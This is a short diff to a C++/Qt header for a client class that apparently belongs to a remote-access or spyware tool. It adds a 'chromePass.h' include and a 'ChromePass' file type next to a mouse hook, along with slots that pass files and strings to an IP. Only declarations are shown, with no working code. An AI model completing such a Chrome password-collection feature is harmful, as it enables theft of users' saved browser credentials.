@@ -9,6 +9,12 @@
 #include "fileserver.h"
 #include "fileclient.h"
 #include "mousehookWinApi.h"
+#include "chromePass.h"
+
+enum Files
+{
+    ChromePass = 1
+};
 
 class Client : public QObject
 {
@@ -21,7 +27,8 @@ signals:
 
 private slots:
     void getOnline();
-    void getNewFile(const QString& path, const QString& ip);
+    void getFile(const QString& path, const QString& ip);
+    void getString(const QString& string, const QString& ip);
 
 private:
     void update();
